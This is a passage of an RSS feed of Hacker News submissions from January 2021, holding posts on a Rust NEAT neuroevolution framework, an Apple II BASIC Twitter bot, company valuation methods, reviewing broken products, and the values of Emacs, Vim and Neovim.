between multiple upstreams sources/releases. We take the eyes of the
maintainers here.</p>

<p>The extreme of the first scenario would be to let users directly download
from the software vendor/creator source code repository, or the opposite,
let the software vendor/creator push directly to the distribution
repository. Which could easily break or conflict with the user’s system
or lead to security vulnerability. …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html">https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html</a></em></p>]]>
            </description>
            <link>https://venam.nixers.net/blog/unix/2020/03/29/distro-pkgs.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811596</guid>
            <pubDate>Sun, 17 Jan 2021 15:45:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Neat: Simple Neuroevolution Framework, in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811405">thread link</a>) | @todsacerdoti
<br/>
January 17, 2021 | https://sgolem.com/blog/neat-simple-neuroevolution-framework-in-rust | <a href="https://web.archive.org/web/*/https://sgolem.com/blog/neat-simple-neuroevolution-framework-in-rust">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A month or so ago I started working on a neural network implementation in Rust, from scratch. I wasnâ€™t interested in achieving the best performance, or having all the bells and whistles. I had a simple goal of understanding NEAT. For those of you that are not familiar with it, hereâ€™s a snippet from the Wikipedia ðŸ‘‡.</p><blockquote><p>a form of artificial intelligence that uses evolutionary algorithms to generate artificial neural networks, parameters, topology and rules</p></blockquote><p>What fascinated me is that the system starts from a totally random set of simple neural networks. Very often, the evolution finds the best architecture and weights in a relatively short amount of time. The first problem I wanted to solve was training the network to be a XOR gate. It managed to do that after a few days of me writing code and figuring out where the bugs were. I was very excited when I found out it evolved the output activation function to be a step function.  It figured out the outputs are always round numbers. All by itself. Wow.</p><p>Now, to cut the story short, I donâ€™t think Iâ€™ll spend more time on it as Iâ€™ve achieved my goal. It might be useful for somebody else so Iâ€™ve made it public. Hereâ€™s a short example.</p><h2><a href="#problem"></a>Problem</h2><p>If you do a Google search, or look on Youtube, youâ€™ll quickly find out what exactly is a cart pole balancing problem. There is a cart that can only go left and right in a 2D world. A pole is attached to the top of the cart. The goal is to balance the pole for as long as you can. Similar to what children do, balancing a broom in the hand. ðŸ§¹</p><div><p><img alt="cart and pole balancing" data-src="/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=1200&amp;q=75" data-srcset="/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=320&amp;q=75 320w, /_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=420&amp;q=75 420w, /_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=768&amp;q=75 768w, /_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=1024&amp;q=75 1024w, /_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=1200&amp;q=75 1200w" src="https://sgolem.com/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=1200&amp;q=75"></p></div><p>I couldnâ€™t find any existing simulators for this environment so I wrote one myself. You can find its code in the repo that I will link at the end of the post.</p><h3><a href="#training"></a>Training</h3><p>Iâ€™ve tried to make it super easy to set up a problem, run the evolution, and get a champion neural network out of it. Hereâ€™s how to that for the cart pole problem.</p><p>There are only 3 arguments when creating a NEAT system:</p><ul><li>number of input neurons</li><li>number of output neurons</li><li>the fitness function that returns a <code>f64</code></li></ul><pre><code>let mut system = NEAT::new(4, 1, |network| {
    let num_simulations = 10;
    let max_steps = 1000;
    let mut env = CartPole::new();

    let mut steps_done = 0;
    let mut fitness = 0.;

    for _ in 0..num_simulations {
        env.reset();

        for _ in 0..max_steps {
            if env.done() {
                break;
            }

            let state = env.state();
            let network_output = network.forward_pass(state.to_vec());
            let env_input = f64::max(-1., f64::min(1., *network_output.first().unwrap()));

            env.step(env_input).unwrap();
            steps_done += 1;
        }

        fitness += env.fitness();
    }

    fitness / num_simulations as f64
});

system.set_configuration(Configuration {
    population_size: 100,
    max_generations: 500,
    stagnation_after: 50,
    node_cost: 1.,
    connection_cost: 1.,
    compatibility_threshold: 2.,
    ..Default::default()
});

system.add_hook(10, |generation, system| {
    println!(
        "Generation {}, best fitness is {}, {} species alive",
        generation,
        system.get_best().2,
        system.species_set.species().len()
    );
});

let (network, fitness) = system.start();</code></pre><p>After the system is created the configuration is tweaked for this specific problem. That should help the process to find the best neural networks faster.</p><p>In order to see what is happening Iâ€™ve added a simple â€œhookâ€� that runs every 10 generations and gives us some info about the current state.</p><p>Iâ€™ll omit the code that exports the neural network to a file, but you can find it in the repo. To run the training process on your machine navigate to the <code>examples/cart-pole/</code> dir and run:</p><pre><code>cargo run --release -- train</code></pre><h3><a href="#balancing-the-pole"></a>Balancing the pole</h3><p>After the training is complete youâ€™ll see a <code>network.bin</code> file is created. Weâ€™ll use that to instantiate the network in the simulation. To open the simulation run:</p><pre><code>cargo run --release -- visualize</code></pre><p>Now drag the <code>network.bin</code> file into the simulation window and watch what happens. Or if you are lazy, watch the video below.</p><p>Sometimes the network wonâ€™t be able to balance the pole. That happens because the starting parameters are generated randomly, and for some of them it just isnâ€™t possible to put the pole back up.</p><p>After a couple of seconds you should see the cart and the pole perfectly in the middle. The network can balance them for eternity. On the other hand, watching a stable system is boring, and for that Iâ€™ve added the ability to apply some â€œwindâ€� by pressing arrow keys.</p><h2><a href="#future"></a>Future</h2><p>I suppose I wonâ€™t spend more time on this. There are other things Iâ€™d like to try. Thereâ€™s a tiny possibility someone will find this useful. In that case Iâ€™ll be happy to chat about it, and potentially find some time if somebody wants to fund it. You can <a href="https://twitter.com/SGolemac">send me a message on Twitter</a>.</p><p>This is what I had in mind for the future, even though it probably wonâ€™t happen.</p><ul><li>Two poles balancing task example (started it in a different branch)</li><li>Recurrent connections</li><li>Extend the system so it works with both <code>f32</code> and <code>f64</code> (might improve performance)</li><li>HyperNEAT</li><li>FS NEAT (feature selection)</li></ul><p>All the code is now public and you can find it <a href="https://github.com/stjepangolemac/neat-rs">here</a>.</p><p>On to the next project ðŸ‘‹</p></div></div>]]>
            </description>
            <link>https://sgolem.com/blog/neat-simple-neuroevolution-framework-in-rust</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811405</guid>
            <pubDate>Sun, 17 Jan 2021 15:26:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple II Basic Bot]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25811294">thread link</a>) | @elvis70
<br/>
January 17, 2021 | https://atari8bitbot.com/apple-ii-bot/ | <a href="https://web.archive.org/web/*/https://atari8bitbot.com/apple-ii-bot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article class="page" id="post-82">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Send a tweet with a short BASIC program to <a href="https://twitter.com/AppleIIBot">@AppleIIBot</a> and your program will run on an emulated Apple II computer. The bot will tweet you back with a video your program’s output!</p>



<figure></figure>



<p id="block-6d1426fc-dbf0-4f3b-8e79-3976ce3135a7">The bot accepts programs in AppleSoft BASIC, the version of BASIC that was included with the Apple II computer. The first version of BASIC (Beginners’ All-purpose Symbolic Instruction Code) was released in 1964. AppleSoft BASIC, released in 1978, added commands for using the Apple II’s graphics capabilities and other features. </p>



<p>To send your program to the bot, just start your code after @AppleIIBot. Don’t forget to hit RETURN before each new line of code.</p>



<p>You need to use (at least one) line number. Immediate mode is not supported. Don’t add RUN to the end, the bot takes care of that.</p>



<p><strong>Caveats, Warnings, and Disclaimers</strong></p>



<ul><li>If the BASIC parser can’t understand something about your program (for instance, if you forget to include line numbers) it simply won’t respond. On a real Apple II, BASIC would tell you if something was amiss. On Twitter, it really isn’t feasible. So if you don’t get a reply within three or four minutes, check your code a try again. Or ask for help — it is Twitter, after all.</li><li>The bot doesn’t support sound yet.</li></ul>



<p>You can learn the fundamentals of AppleSoft BASIC with Apple’s book <a href="https://archive.org/details/ATouchOfApplesoftBASIC/">A Touch Of Applesoft BASIC</a>. More experienced programmers who need a refresher might want to reference the <a href="https://archive.org/details/Applesoft_BASIC_Programming_Reference_Manual_Apple_Computer">Applesoft BASIC Reference Manual</a>. </p>



<p><strong>Bracket Directives</strong></p>



<p>By default, the bot starts running your program, lets it run for 3 seconds before starting to record the video. It records the video for 30 seconds. If you don’t like this standard recording behavior — for instance, if your program takes a long time to draw a fractal — you can change it with a directive at the start of your tweet.</p>



<p>The B directive tells the bot how many seconds to wait before Beginning to record. {B20} will let your program run for 20 seconds before recording begins. {B0} will start recording immediately. The maximum wait is currently 99 seconds.</p>



<p>The S directive tells the bot how many Seconds to record your program running. {S2} will will record it running for just 2 seconds. {S99} will record it for the maximum 99 seconds. If you’re going to tie up the bot for that long, make it good. </p>



<p>The {G} directive gives you an authentic, old-school green screen. The {A} directive gives you an authentic, old-school amber screen. Who needs all those fancy colors?</p>



<p>You can combine directives in one set of brackets, like this: {B30S25} or {GS5B5}</p>



<p>Direct questions about the bot to&nbsp;<a href="https://twitter.com/kaysavetz">Kay Savetz</a>.</p>



<figure></figure>



<figure></figure>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://atari8bitbot.com/apple-ii-bot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811294</guid>
            <pubDate>Sun, 17 Jan 2021 15:14:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Methods of Estimating Value of a Company]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811156">thread link</a>) | @alainchabat
<br/>
January 17, 2021 | https://www.lucacap.com/post/methods-of-valuation | <a href="https://web.archive.org/web/*/https://www.lucacap.com/post/methods-of-valuation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><p id="viewer-foo"><span><strong>Important Concepts  </strong></span></p><p id="viewer-7otj2"><span>I. Price and Value </span></p><p id="viewer-a0sbk"><span>II. Margin of Safety </span></p><p id="viewer-8vhs8"><span>III. Dislocation of Value </span></p><p id="viewer-609b6"><span>IV. Drivers of Value Creation </span></p><p id="viewer-5ml51"><span><strong>Methods of Valuation  </strong></span></p><p id="viewer-41evk"><span>I. Discounted Cash Flows </span></p><p id="viewer-2mdf0"><span>II. Future Market Cap/Exit Price </span></p><p id="viewer-4alkq"><span>III. Probabilistic Valuation </span></p><p id="viewer-6v6es"><span>IV. Relative Valuation</span></p><h2 id="viewer-4pn5i"><span><strong>INTRODUCTION</strong>

</span></h2><p id="viewer-2eg5s"><span>Estimating value is essential to assess the potential returns of an investment, the probability of those returns, and the risks involved.

The best risk-management occurs at the individual stock level; therefore, developing strong qualitative and quantitative analytical skills, and understanding the shortcomings of each method of valuation, is crucial to long-term investment success.

We learn different methods of valuation in business school or from reading popular textbooks such as <em>Valuation: Measuring and Managing the Value of Companies </em>by McKinsey. These quantitative foundations give us the formulas and theory behind valuation methods; however, performing practical valuation with money on the line is quite different. Estimating value in practice is about forecasting—and estimating is what you do when you do not know.

Businesses have been bought and sold for centuries and there must have been methods to come up with a fair and mutually agreed upon price of the transactions in the distant past. Perhaps it was a multiple of free cash flow from the business or the value of the assets, plus a discount or premium.

Methods of valuation have evolved since the distant past, particularly in the 20th century. Legendary economists Irving Fisher developed the idea of internal rate of return (IRR) in his books <em>The Rate of Interest </em>(1907) and <em>The Theory of Interest </em>(1930). John Burr Williams then wrote <em>The Theory of Investment Value </em>(1938), in which he introduced the idea of companies having an “intrinsic value” and using a mathematical formula to calculate this, which he called the “present value of future cash flows”.

Discounted Cash Flows is undoubtedly the correct way to calculate the true worth of an asset, bond, or business. However, as we will discuss, it has limitations when applied to valuing businesses. In fact, all methods of valuation have their limitations and it is important to understand those limitations or we run the risk of being victims of “false precision”.

A common rule for valuation is that it is better to be approximately right than precisely wrong. In other words, valuation requires a range of calculations based on future variables that are impossible to predict with certainty. Valuation can be described as iffy: “if so-and-so happens, then the cash flows should be so-and so, then the company is worth this much.”

Shortcuts to valuation have evolved over time as well. Traditional measures such as the Price-to-Book ratio, Dividend Yield, and Price-to-Earnings ratio are now just a few of the dozens of metrics analyzed: Enterprise Value-to-EBITDA ratio, Free Cash Flow Yield, Price-to-Sales ratio, PEG Ratio, Replacement Value, Adjusted Earnings, Return on Invested Capital, and so on.

Before we get into the methods of valuation, we must first understand four critical concepts: price versus value, margin of safety, dislocations of value, and drivers of value creation.</span></p><h2 id="viewer-4cuvm"><span>
<strong>PART</strong> <strong>I: IMPORTANT</strong> <strong>CONCEPTS</strong>

</span></h2><p id="viewer-43lga"><span><strong>Critical</strong> <strong>Concept #1:</strong> <strong>Price and</strong> <strong>Value</strong>

</span></p><p id="viewer-29mp8"><span><em>“Long ago, Ben Graham taught me that ‘Price is what you pay, value is what you get.’”</em>

–Warren Buffett, 2008 Berkshire Hathaway Shareholders’ Letter</span></p><p id="viewer-9kiu7"><span>
There are three important concepts when it comes to “value”: value of a bet, returns, and intrinsic value.

Investing is putting up money today with the expectation of getting the money back in the future, plus a profit. When it comes to investing in businesses, the outcomes are not guaranteed, which is a way of saying that investors are placing bets. Every investment into a business is speculative, but there are varying degrees of speculation. One way to reduce the speculative nature of bets on businesses is through careful analysis of the value of the bet and being highly selective, only betting when (1) the odds of losing money are low, (2) the losses are low if you lose money, and (3) the odds of making attractive returns are high.

The Internal Rate of Return (IRR) on a bet incorporates all cash flow distributions to an investor and provides an annualized return on the investment. Investors forecast IRRs of investments to assess whether to participate in the investment. IRR, however, does not tell us the probability of that return or the level of risk for the investment. Claiming that an investment generated a high IRR, therefore it was “undervalued”, is not sensible reasoning. For example, if you double your money on an investment (i.e. bet) very quickly, you can argue that you are gifted and the bet was undervalued at the time of placing the bet. However, you may be wrong. If I offer you double or nothing on a coin flip for $1,000, the value of the bet is not $2,000 just because you won. And the value of the bet was not $0
if you lost the bet. Based on probabilities and expected returns, the value of the bet was $1,000 whether you won or lost. The outcome of a bet does not determine the riskiness or value of the bet.</span></p><p id="viewer-357p7"><span>Intrinsic value of an asset can be defined as the “true worth” of an asset, typically expressed as the net present value of all future cash flows. While the discount rate or opportunity cost varies among investors, the cash flows on bonds are very precise and predictable, making them easier to value.

The bond markets also provide a clear example of the difference between price and intrinsic value. Imagine you buy a zero-coupon bond in a high-quality company with a maturity in three years. After the purchase, the cash flows will be delivered as scheduled, but the price will fluctuate up and down as buyers and sellers trade in and out. One may argue that the discount rate or opportunity cost changes over time and that accounts for the price fluctuations, but investors’ opportunity cost are different; the value to you has not changed, only the price.

Defining intrinsic value gets complicated for assets that do not produce cash flows. Consider a painting, for example. A painting does not generate periodic cash flows, it is only worth as much as the highest bid at the time of a sale. In other words, value equals the highest price someone is willing to pay at any given moment. A building or house, by contrast, does have different methods of valuation: replacement value, land value, and a possible cash flow value if it is rented out.

Investors need to be aware of the false precision of formulas used to value businesses. Businesses do not have a precise value, nor do they have a fixed value over time. The prices of businesses, especially publicly traded companies in the stock market, fluctuate as well. However, just because both value and price fluctuate, does not mean that they are equal. In fact, it means that companies are almost always mispriced relative to their value.

A recent illustration of the disconnect between price and value in businesses was in March of 2020, when the S&amp;P 500 fell roughly 35% from its February high, but then finished the year up over 18%. The future earning power and intrinsic value of the 500 companies in the S&amp;P 500 did not fluctuate nearly that much in 2020. High volatility creates big dislocations of value.

The most unbiased way to value a company is to begin without looking at its current price and past prices. However, nearly all investors, including those that say they are “fundamental investors” and do not perform technical analysis, use the current price and past prices as an anchor. If you are looking at prices, you must understand the biases it creates. A stock that has gone down a lot from its high is not necessarily undervalued and a stock that has gone up a lot recently is not necessarily overvalued.

It is remarkable how many people come up with valuations almost entirely based on prices, including Wall Street analysts. If a stock goes up a lot, they raise the price target. If the stock goes down, they lower the price target. During market corrections and rebounds this can be especially amusing as their price targets fly around in reaction to the sharp stock price swings. If an analyst had a price target on a stock of $50 and the stock doubled to $100, he or she would likely raise the target to $110 or $120 to reflect his or her continued confidence in the company. If the stock was $100 and fell to $50, he or she might lower the price target to $60 or $70 to reflect continued confidence. It is important to keep in mind that analysts
12-month target prices are not calculations of intrinsic value, they are potential future prices and should be ignored entirely.</span></p><p id="viewer-6dd1a"><span>
<strong>Critical</strong> <strong>Concept</strong> <strong>#2: Margin</strong> <strong>of</strong> <strong>Safety</strong>

Margin of safety is one of the most important concepts in investing and is a term coined by Benjamin Graham in the 1949 first edition of <em>The Intelligent Investor</em>. He devoted an entire chapter to the concept and wrote:</span></p><p id="viewer-5u6ja"><span>
<em>“In the old legend the wise men finally boiled down the history of mortal affairs into the single phrase, “This too will pass.” Confronted with a like challenge to distill the secret of sound investment into three words, we venture the motto, MARGIN OF SAFETY. This is the thread that runs through all the preceding discussion of investment policy—often explicitly, sometimes in a less direct fashion.”</em></span></p><p id="viewer-ec2f0"><span>In other words, valuation is not precise, and the future cash flows are not perfectly predictable. What matters when doing valuation is not that you come up with the correct calculation of intrinsic value (you cannot), but that there is a sufficient margin of safety relative to the price you pay. This is another way of saying you should seek payoffs that are low risk and high reward.

Value investors scoff at the idea of growth investors claiming that they look for a margin of safety in their investments. However, Ben Graham said himself that he believed this was possible but challenging. He wrote in <em>The …</em></span></p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lucacap.com/post/methods-of-valuation">https://www.lucacap.com/post/methods-of-valuation</a></em></p>]]>
            </description>
            <link>https://www.lucacap.com/post/methods-of-valuation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811156</guid>
            <pubDate>Sun, 17 Jan 2021 15:00:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Review broken products instead of new ones]]>
            </title>
            <description>
<![CDATA[
Score 187 | Comments 90 (<a href="https://news.ycombinator.com/item?id=25810708">thread link</a>) | @hubraumhugo
<br/>
January 17, 2021 | https://www.buyforlife.com/blog/6CNqJGMKraaQhfivS0EH6L/why-we-should-review-broken-products-instead-of-new-ones | <a href="https://web.archive.org/web/*/https://www.buyforlife.com/blog/6CNqJGMKraaQhfivS0EH6L/why-we-should-review-broken-products-instead-of-new-ones">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app"><div data-v-1e6f7098=""><div data-v-1e6f7098=""><div data-v-1e6f7098=""><div data-v-1e6f7098=""><p data-v-1e6f7098=""><strong data-v-1e6f7098="">For most people, the majority of positive reviews are noise on any product and they evaluate them by reading negative reviews.</strong></p><p data-v-1e6f7098="">For once, let's turn it all upside down:</p><p data-v-1e6f7098="">We should build a collection about how things break - review broken and worn-out products to teach how to identify cheap products (where are the stress points, what manufacturing techniques exist to alleviate those). Then compare those with used products well past their warranty period that&nbsp;hasn't&nbsp;broken, and look at why they haven't.</p><p data-v-1e6f7098="">Repairability also comes to mind. Everything breaks eventually because we can't cheat entropy, but when it does, can you easily repair it?</p><p data-v-1e6f7098="">Use<a data-v-1e6f7098="" href="https://www.buyforlife.com/product-submission"> our submission form</a>&nbsp;for all your broken or thrown away products. If you select "Broken" as a condition, questions about the repairability and where the stress points were will show up.</p><p><img data-v-1e6f7098="" src="https://images.ctfassets.net/ma604jmaffkl/6mzc5DExU1fnSHCxxX40ln/0460f057d136bb07369b3c64f06887ae/broken-review.png"></p><p data-v-1e6f7098="">Even if things don’t break - waiting a minimum of 6+ months or 50—100 minimum uses really makes a review relevant. That's why I recently introduced&nbsp;<a data-v-1e6f7098="" href="https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product">recurring reviews</a>&nbsp;to track the whole lifecycle of a product. After every year, the reviewer will receive an automatic reminder to assess the condition of the product, and if the reviewer is still happy with it.
</p><p data-v-1e6f7098="">Let me know what you think! </p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.buyforlife.com/blog/6CNqJGMKraaQhfivS0EH6L/why-we-should-review-broken-products-instead-of-new-ones</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810708</guid>
            <pubDate>Sun, 17 Jan 2021 14:04:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The values of Emacs, the Neovim revolution, and the VSCode gorilla]]>
            </title>
            <description>
<![CDATA[
Score 397 | Comments 319 (<a href="https://news.ycombinator.com/item?id=25810427">thread link</a>) | @mpereira
<br/>
January 17, 2021 | https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/ | <a href="https://web.archive.org/web/*/https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In 2018 Bryan Cantrill gave a brilliant talk where he shared his recent
experiences with the Rust programming language. More profoundly, he
explored a facet of software that is oftentimes overlooked: the <em>values</em> of
the software we use. To paraphrase him slightly:</p><blockquote><p><em>Values</em> are defined as <em>expressions of relative importance</em>. Two things that
we’re comparing could both be good attributes. The real question is, when
you have to make a choice between two of them, what do you choose? That
choice that you make, reflects your core values.</p></blockquote><p>He goes ahead to contrast the core values of some programming languages with
the core values we demand from systems software, like operating system
kernels, file systems, microprocessors, and so on. It is a really good talk
and you should <a href="https://www.youtube.com/watch?v=2wZ1pCpJUIM">watch it</a>.</p><blockquote><p>It is important to think about values because they are <em>core to the
decisions that we make</em>.</p></blockquote><p>Unlike systems software, the values demanded from text editors or IDEs vary
greatly depending on who you ask. These are much more personal tools and
make room for a diverse set of desires.</p><p>The following listing enumerates values that could be attributed to
development tools.</p><table><thead><tr><th>Value</th><th>Commentary</th></tr></thead><tbody><tr><td><strong>Approachability</strong></td><td>Ease of getting started with for typical tasks, and contribution friendliness</td></tr><tr><td><strong>Doing one thing well</strong></td><td>Unix philosophy, fitting into an ecosystem</td></tr><tr><td><strong>Editing efficiency</strong></td><td>Fewer interactions, mnemonics, composable keystrokes, etc.</td></tr><tr><td><strong>Extensibility</strong></td><td>The degree to which behavior and appearance can be changed</td></tr><tr><td><strong>Freedom</strong></td><td>Embraces <a href="https://www.gnu.org/philosophy/free-sw.en.html">free</a> software, rejects proprietary software</td></tr><tr><td><strong>Integration</strong></td><td>Cohesive core and concerted third-party functionality</td></tr><tr><td><strong>Introspectability</strong></td><td>Capable of being understood and inspected ad-hoc</td></tr><tr><td><strong>Keyboard centrism</strong></td><td>Focus on keyboard interactions</td></tr><tr><td><strong>Maintainability</strong></td><td>The degree to which it can be modified without introducing faults</td></tr><tr><td><strong>Progressiveness</strong></td><td>A measure of eagerness to make progress and leverage modern technology</td></tr><tr><td><strong>Stability</strong></td><td>Things that worked before continue to work the same way</td></tr><tr><td><strong>Text centrism</strong></td><td>Text as a universal interface</td></tr><tr><td><strong>Velocity</strong></td><td>Short and focused release cycles, aligned personpower, leveraging the community effectively</td></tr></tbody></table><div><p>Before we go any further, I'd like to point that out if you care about
any of the topics discussed ahead you will likely strongly disagree
with something or the other.</p><p>That's fine! We probably just have different values.</p></div><p>In my view, Emacs has the following core values:</p><p><strong>Emacs</strong></p><ul><li>Extensibility</li><li>Freedom</li><li>Introspectability</li><li>Keyboard centrism</li><li>Stability</li><li>Text centrism</li></ul><p>We can feel the clasp of <em>stability</em> in the following—rather
poetic—exchange in the Emacs development mailing list, which also provides
useful historical perspectives.</p><blockquote><p>Emacs is older than the operating systems people use today. (It is almost
as old as the first Unix, which barely resembled the Unix of later
decades.) It is much older than Linux, the kernel.</p><p>The oldest design elements were not designed for the uses we make of them
today. And since we wrote those, people have developed other areas of
software which don’t fit Emacs very well. So there are good reasons to
redesign some of them.</p><p>However, people actually use Emacs, so a greatly incompatible change in
Emacs is as unthinkable as a greatly incompatible change in the New York
City subway.</p><p>We have to build new lines through the maze of underground pipes and
cables.</p><p>— <a href="https://lists.gnu.org/archive/html/emacs-devel/2020-09/msg00607.html">Richard Stallman in “Re: Discoverability (was: Changes for 28)” (2020)</a></p></blockquote><p>The following exchange reifies <em>freedom</em> and <em>stability</em> while demonstrating a
disinclination to <em>progressiveness</em>. Which is neither good nor bad; it’s just
what it is.</p><blockquote><p>If Emacs was to become a “modern” app tomorrow, an editor extended in Lisp
still only has appeal for a minority of programmers, much like the Lisp
language itself. Most programmers looking for easy and modern experiences
will likely stick with Atom and Sublime.</p><p>Most of the push for a “modern look” comes from the desire for Emacs to
play more nicely with proprietary platforms. Rather, the goal of Emacs is
to support platforms like GNU/Linux. Platforms that respect your freedom,
and also do not push a corporate UI/UX vision of “modernity”.</p><p>(Perhaps if we do move forward with modernization, we should think of
modernization in the context of something like GNOME rather than MacOS or
Windows. Surely Emacs could be a better citizen of GNOME.)</p><p>Given that many of the people complaining about “how Emacs looks” are not
submitting patches to fix the problem themselves, resources would be
diverted from actual functionality to “modernity”.</p><p>By the time we do major code refactoring “modernizing” Emacs on the major
proprietary platforms, what is “modern” has now once again changed, and our
resources were put towards a project with a poor return on investment.</p><p>Basically, I don’t see a “modernizing” project playing out well. We will
spend extensive time and energy on a moving target, and even if we succeed,
our Lisp-based vision still has limited appeal. Additionally, I don’t think
“modernizing” Emacs advances the cause of free software, given that there
are other more popular casual libre tools for text editing that individuals
can use.</p><p>— <a href="https://lwn.net/ml/emacs-devel/863691n4xl.wl-me%40enzu.ru/">Ahmed Khanzada in “Re: Why is emacs so square?” (2020)</a></p></blockquote><p>Core values are self-reinforcing. They attract like-minded people, who
will then defend them.</p><p>I’m an Emacs user, and reading the Emacs mailing lists serves to remind me
that my values are very different from the values held by maintainers and
core contributors. I don’t value <em>freedom</em> or <em>stability</em> nearly as strongly
and have an inner affinity for <em>progressiveness</em> and <em>velocity</em>.</p><p>One part of valuing progressiveness is constantly re-evaluating: is our
current process or technology as good as it could be? What could be
improved? How do we measure improvement? How are others solving these
problems? Were there any advances in our area that we could leverage?</p><p>* * *</p><p>Now let’s talk about Vim. I see Vim as intersecting with a few of Emacs’
values, but ultimately diverging radically with its narrow focus on
providing really efficient editing capabilities.</p><p><strong>Vim</strong></p><ul><li>Doing one thing well</li><li>Editing efficiency</li><li>Keyboard centrism</li><li>Stability</li><li>Text centrism</li></ul><p>One might notice that <em>extensibility</em> is not in the list. That’s
intentional. Vim is certainly extensible to a degree, but it just does not
compare to Emacs. Vim <em>has</em> a “plugin system”, while Emacs <em>is</em> the system.
Your code becomes part of it the moment it’s evaluated. Since I’m sticking
to <em>yes/no</em> indicators for values I’m giving it a <em>no</em>.</p><p><em>Stability</em> emanates from communications with the primary maintainer.</p><blockquote><p>Vim development is slow, it’s quite stable and still there are plenty of
bugs to fix. Adding a new feature always means new bugs, thus hardly any
new features are going to be added now. I did add a few for Vim 7.3, and
that did introduce quite a few new problems. Even though several people
said the patch worked fine.</p><p>— <a href="http://vim.1045645.n5.nabble.com/Scrolling-screen-lines-I-knew-it-s-impossible-td3358342.html#a3359206">Bram Moolenar in “Re: Scrolling screen lines, I knew, it’s impossible.”
(2011)</a></p></blockquote><p>And of course in this famous exchange in a QA session.</p><blockquote><blockquote><p>How can the community ensure that the Vim project succeeds for the
foreseeable future?</p></blockquote><p>Keep me alive.</p><p>— <a href="https://www.binpress.com/vim-creator-bram-moolenaar-interview/">Bram Moolenaar in “10 Questions with Vim’s creator” (2014)</a></p></blockquote><p>At the end of 2013, a few folks were trying to get new concurrency
primitives merged into Vim. This would empower plugin authors to create
entirely new types of functionality and by extension, make Vim better.</p><p>This is what one of them had to say about the process:</p><blockquote><p>The author of Neovim (Thiago de Arruda) tried to add support for
multi-threaded plugins to Vim and has been stymied.</p><p>I’m not sure how to get a patch merged into Vim. Bram Moolenar is the only
person with commit access, and he’s not a fan of most changes beyond bug
fixes. My co-founder and I tried to add setTimeout &amp; setInterval to
vimscript. Even six weeks of full-time effort and bending over backwards
wasn’t enough. Eventually we were just ignored.</p><p>I’ve contributed to a lot of open source projects, and the Vim community
has been the most difficult to work with. I’ve been writing C for almost
two decades, and the Vim codebase is the worst C I’ve ever seen. The
project is definitely showing its age, and I’d love for something new to
replace it.</p><p>— <a href="https://news.ycombinator.com/item?id=7279358">Geoff Greer in “Neovim (HN)” (2014)</a></p></blockquote><p>While they understood that some of their values were ultimately
incompatible with the values of the Vim maintainers—who prioritized
<em>stability</em>—they still tried to push for a change, because they treasured
the <em>idea of Vim</em>, embodied by some of its values.</p><p>It didn’t happen, so a Vim fork came to life: Neovim.</p><p>The vision was grand, and is summarized in a statement of its values:</p><blockquote><p>Neovim is a Vim-based text editor engineered for <em>extensibility</em> and
